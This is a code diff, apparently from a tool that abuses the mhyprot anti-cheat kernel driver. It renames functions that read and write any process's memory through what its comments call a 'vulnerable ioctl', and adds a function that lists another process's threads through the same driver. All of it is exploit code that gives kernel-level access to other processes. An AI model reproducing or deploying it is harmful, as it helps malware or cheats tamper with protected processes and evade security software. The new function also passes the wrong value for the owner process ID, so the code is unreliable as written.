@@ -323,7 +323,7 @@ bool mhyprot::driver_impl::read_kernel_memory(
 // read specific process memory from the kernel using vulnerable ioctl
 // let the driver to execute MmCopyVirtualMemory
 //
-bool mhyprot::driver_impl::read_user_memory(
+bool mhyprot::driver_impl::read_process_memory(
     const uint32_t process_id,
     const uint64_t address, void* buffer, const size_t size
 )
@@ -348,7 +348,7 @@ bool mhyprot::driver_impl::read_user_memory(
 // write specific process memory from the kernel using vulnerable ioctl
 // let the driver to execute MmCopyVirtualMemory
 //
-bool mhyprot::driver_impl::write_user_memory(
+bool mhyprot::driver_impl::write_process_memory(
     const uint32_t process_id,
     const uint64_t address, void* buffer, const size_t size
 )
@@ -461,4 +461,56 @@ uint32_t mhyprot::driver_impl::get_system_uptime()
     // convert it to the seconds
     //
     return static_cast<uint32_t>(result / 1000);
+}
+
+bool mhyprot::driver_impl::get_process_threads(
+    const uint32_t& process_id, const uint32_t& owner_process_id,
+    std::vector<MHYPROT_THREAD_INFORMATION>& result
+)
+{
+    const size_t alloc_size = 50 * MHYPROT_ENUM_PROCESS_THREADS_SIZE;
+
+    PMHYPROT_ENUM_PROCESS_THREADS_REQUEST payload =
+        (PMHYPROT_ENUM_PROCESS_THREADS_REQUEST)calloc(1, alloc_size);
+
+    if (!payload)
+    {
+        return false;
+    }
+
+    payload->validation_code = MHYPROT_ENUM_PROCESS_THREADS_CODE;
+    payload->process_id = process_id;
+    payload->owner_process_id = process_id;
+
+    if (!request_ioctl(MHYPROT_IOCTL_ENUM_PROCESS_THREADS, payload, alloc_size))
+    {
+        free(payload);
+        return false;
+    }
+
+    if (!payload->validation_code ||
+        payload->validation_code <= 0 ||
+        payload->validation_code > 1000)
+    {
+        free(payload);
+        return false;
+    }
+
+    const void* payload_context = reinterpret_cast<void*>(payload + 1);
+
+    const uint32_t thread_count = payload->validation_code;
+
+    for (uint64_t offset = 0x0;
+        offset < (MHYPROT_ENUM_PROCESS_THREADS_SIZE * thread_count);
+        offset += MHYPROT_ENUM_PROCESS_THREADS_SIZE)
+    {
+        const auto thread_information = 
+            reinterpret_cast<PMHYPROT_THREAD_INFORMATION>((uint64_t)payload_context + offset);
+
+        result.push_back(*thread_information);
+    }
+
+    free(payload);
+
+    return true;
 }
